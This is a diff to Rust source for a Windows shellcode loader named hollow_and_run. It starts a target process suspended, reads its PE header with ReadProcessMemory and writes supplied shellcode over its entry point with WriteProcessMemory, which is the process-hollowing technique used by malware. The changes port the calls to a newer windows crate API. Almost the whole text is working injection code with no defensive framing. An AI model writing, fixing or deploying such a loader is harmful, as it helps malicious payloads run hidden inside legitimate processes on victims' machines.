@@ -1,4 +1,4 @@
-use std::ffi::{c_void, CString};
+use core::ffi::c_void;
 use std::ptr;
 use windows::core::{PCSTR, PSTR};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
@@ -21,7 +21,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    let lp_command_line = PSTR(CString::new(target_process).unwrap().into_raw() as *mut u8);
+    let lp_command_line = PSTR::from_raw(format!("{target_process}\0").as_mut_ptr());
     let creation_result = unsafe {
         CreateProcessA(
             PCSTR::null(),
@@ -30,7 +30,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             None,
             false,
             CREATE_SUSPENDED,
-            ptr::null(),
+            None,
             PCSTR::null(),
             &STARTUPINFOA::default(),
             &mut process_information,
@@ -66,7 +66,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ReadProcessMemory(
             process_handle,
             image_base_address as *const c_void,
-            &mut address_buffer,
+            address_buffer.as_mut_ptr() as *mut c_void,
+            POINTER_SIZE as usize,
             None,
         )
     };
@@ -82,7 +83,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         ReadProcessMemory(
             process_handle,
             pe_base_address as *const c_void,
-            &mut header_buffer,
+            header_buffer.as_mut_ptr() as *mut c_void,
+            0x200,
             None,
         )
     };
@@ -103,7 +105,8 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         WriteProcessMemory(
             process_handle,
             entry_point_address as *const c_void,
-            shellcode,
+            shellcode.as_ptr() as *const c_void,
+            shellcode.len(),
             None,
         )
     };
